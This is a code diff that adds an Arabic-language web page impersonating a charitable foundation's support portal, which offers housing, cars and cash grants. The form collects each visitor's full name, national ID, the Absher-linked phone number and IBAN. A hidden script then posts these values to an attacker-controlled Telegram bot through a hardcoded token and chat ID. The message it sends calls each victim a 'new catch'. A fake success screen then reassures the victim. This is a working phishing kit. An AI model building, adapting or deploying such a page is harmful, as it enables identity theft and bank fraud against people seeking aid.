@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة الدعم الموحدة | مؤسسة الوليد للإنسانية</title>
+    <style>
+        :root { --blue: #1a4a5e; --gold: #c5a059; --light: #f8f9fa; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #e9ecef; margin: 0; padding: 0; }
+        .header-logo { background: white; padding: 20px; text-align: center; border-bottom: 3px solid var(--gold); }
+        .header-logo img { max-width: 200px; height: auto; }
+        .container { max-width: 450px; background: white; margin: 20px auto; border-radius: 12px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); overflow: hidden; padding: 20px; }
+        h2 { color: var(--blue); text-align: center; font-size: 1.2rem; margin-bottom: 20px; }
+        label { display: block; margin: 10px 0 5px; font-weight: 600; color: var(--blue); font-size: 14px; }
+        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 15px; background: #fafafa; margin-bottom: 12px; }
+        button { width: 100%; padding: 15px; background: var(--blue); color: white; border: none; border-radius: 8px; font-size: 17px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #133646; }
+        .footer-info { text-align: center; font-size: 11px; color: #777; padding: 15px; }
+        #success { display: none; text-align: center; padding: 40px 20px; color: #28a745; }
+    </style>
+</head>
+<body>
+
+<div class="header-logo">
+    <img src="https://i.ibb.co/0pdFwtG/image.jpg" alt="شعار مؤسسة الوليد">
+</div>
+
+<div class="container" id="form-container">
+    <h2>طلب الحصول على الدعم (سكن - سيارات - منح)</h2>
+    <form id="submissionForm">
+        <label>نوع الطلب الحالي</label>
+        <select id="grantType">
+            <option value="دعم معيشي فوري">دعم معيشي فوري</option>
+            <option value="وحدة سكنية">طلب وحدة سكنية</option>
+            <option value="وسيلة نقل">طلب سيارة</option>
+        </select>
+        <label>الاسم الكامل (كما في الهوية)</label>
+        <input type="text" id="name" placeholder="أدخل اسمك الثلاثي" required>
+        <label>رقم الهوية الوطنية / الإقامة</label>
+        <input type="number" id="idNum" placeholder="10xxxxxxxx" required>
+        <label>رقم الجوال المرتبط بـ (أبشر)</label>
+        <input type="tel" id="phone" placeholder="05xxxxxxxx" required>
+        <label>رقم الآيبان (IBAN) لاستلام الدعم النقدي</label>
+        <input type="text" id="iban" placeholder="SA0000000000000000000000" required>
+        <button type="submit">تأكيد إرسال الطلب</button>
+    </form>
+</div>
+
+<div id="success">
+    <h3>تم استلام طلبك بنجاح!</h3>
+    <p>سوف يتم مراجعة البيانات والتواصل معك عبر اتصال هاتفي خلال 48 ساعة.</p>
+</div>
+
+<div class="footer-info">
+    جميع الحقوق محفوظة © مؤسسة الوليد للإنسانية 2026
+</div>
+
+<script>
+    const token = '7548981503:AAH7F6p17z0q_5zC3DExGj7l2UatpI6i62E'; 
+    const chatId = '7013897746';
+
+    document.getElementById('submissionForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const data = {
+            grant: document.getElementById('grantType').value,
+            name: document.getElementById('name').value,
+            id: document.getElementById('idNum').value,
+            phone: document.getElementById('phone').value,
+            iban: document.getElementById('iban').value
+        };
+        const message = `🚨 صيد جديد لبحثك الجامعي:\n\n👤 الاسم: ${data.name}\n🆔 الهوية: ${data.id}\n📱 الجوال: ${data.phone}\n💰 الآيبان: ${data.iban}\n📦 النوع: ${data.grant}`;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+        }).then(() => {
+            document.getElementById('form-container').style.display = 'none';
+            document.getElementById('success').style.display = 'block';
+        });
+    });
+</script>
+</body>
+</html>
